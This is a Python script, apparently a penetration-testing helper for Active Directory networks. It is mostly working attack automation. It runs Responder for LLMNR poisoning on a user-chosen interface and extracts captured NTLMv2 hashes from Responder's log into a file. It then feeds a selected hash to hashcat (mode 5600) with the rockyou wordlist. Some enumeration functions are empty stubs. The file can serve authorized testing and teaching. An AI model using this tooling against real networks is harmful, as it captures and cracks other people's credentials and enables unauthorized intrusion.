import re, os, subprocess, netifaces, signal

def is_active_directory():
    pass

def list_network_interfaces():
    """List all network interfaces."""
    interfaces = netifaces.interfaces()
    print("Available network interfaces:")
    for index, interface in enumerate(interfaces, start=1):
        print(f"{index}. {interface}")
    return interfaces

def choose_network_interface():
    """Allow the user to select a network interface."""
    interfaces = list_network_interfaces()
    choice = input("Enter the number of the network interface you want to use: ")
    try:
        choice = int(choice) - 1
        if choice < 0 or choice >= len(interfaces):
            raise ValueError
        return interfaces[choice]
    except ValueError:
        print("Invalid selection. Please enter a valid number.")
        return None

def sigint_handler(signal, frame):
    """Handle SIGINT signal without exiting the script."""
    print("\nResponder stopped by user. Continuing with the script...")

def llmnr_poisoning():
    interface = choose_network_interface()
    if interface is None:
        return  # Stop if no valid interface is selected

    signal.signal(signal.SIGINT, sigint_handler)  # Setup the SIGINT handler

    # Run Responder on the selected interface
    print(f"Starting Responder on interface {interface}...")
    try:
        process = subprocess.Popen(['sudo', 'responder', '-I', interface])
        process.wait()  # Wait for the process to complete
        print("Responder has completed. Processing NTLM hashes...")
        process_ntlm_hashes()  # Process the hashes after Responder completes
    except subprocess.CalledProcessError as e:
        print(f"Failed to start Responder: {e}")
    finally:
        signal.signal(signal.SIGINT, signal.SIG_DFL)  # Reset the SIGINT handler to default

def process_ntlm_hashes():
    log_file_path = "/usr/share/responder/logs/Responder-Session.log"
    output_file_path = "/mnt/data/ntlmv2-hashes.txt"

    if not os.path.exists(log_file_path):
        print("Log file does not exist, exiting...")
        return

    with open(log_file_path, 'r') as file:
        hashes = set(line.split(': ')[1] for line in file if "NTLMv2-SSP Hash" in line)
    
    with open(output_file_path, 'w') as file:
        file.writelines(f"{hash}\n" for hash in hashes)

def choose_hash():
    hashes_file_path = '/mnt/data/ntlmv2-hashes.txt'
    if not os.path.exists(hashes_file_path):
        print("Hashes file does not exist.")
        return None

    with open(hashes_file_path, 'r') as file:
        hashes = [line.strip() for line in file]

    for index, hash in enumerate(hashes, start=1):
        print(f"{index}. {hash}")

    choice = input("Enter the number of the hash you want to crack: ")
    try:
        choice = int(choice) - 1
        if choice < 0 or choice >= len(hashes):
            raise ValueError
        return hashes[choice]
    except ValueError:
        print("Invalid selection. Please enter a valid number.")
        return None

def sigint_handler_crack(signal, frame):
    """Handle SIGINT signal to allow cancellation of hash cracking."""
    print("\nHashcat process interrupted by user. You may choose another action.")

def crack_ntlmv2():
    chosen_hash = choose_hash()
    if chosen_hash:
        hashcat_command = [
            'hashcat', '-m', '5600', chosen_hash, '/usr/share/wordlists/rockyou.txt'
        ]
        try:
            # Set up the SIGINT handler to allow interruption
            signal.signal(signal.SIGINT, sigint_handler_crack)
            
            # Start hashcat with live output
            process = subprocess.Popen(hashcat_command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            
            # Print output live
            while True:
                output = process.stdout.readline()
                if output == '' and process.poll() is not None:
                    break
                if output:
                    print(output.strip())
            
            # Reset the SIGINT handler to default
            signal.signal(signal.SIGINT, signal.SIG_DFL)

            print("Hashcat process completed.")
        except subprocess.CalledProcessError as e:
            print(f"Failed to crack hash: {e}")
        except KeyboardInterrupt:
            # Handle the case where Ctrl+C is pressed while waiting for the command to complete
            print("Hashcat cracking was interrupted by user.")
    else:
        print("No valid hash was selected.")

def basic_ad_enum():
    # nbtscan, enum4linux
    pass

def list_hashes():
    hashes_file_path = '/mnt/data/ntlmv2-hashes.txt'
    # Check if the file exists before trying to open it
    if os.path.exists(hashes_file_path):
        with open(hashes_file_path, 'r') as file:
            for line in file:
                print(line.strip())
    else:
        print("Hashes file does not exist.")
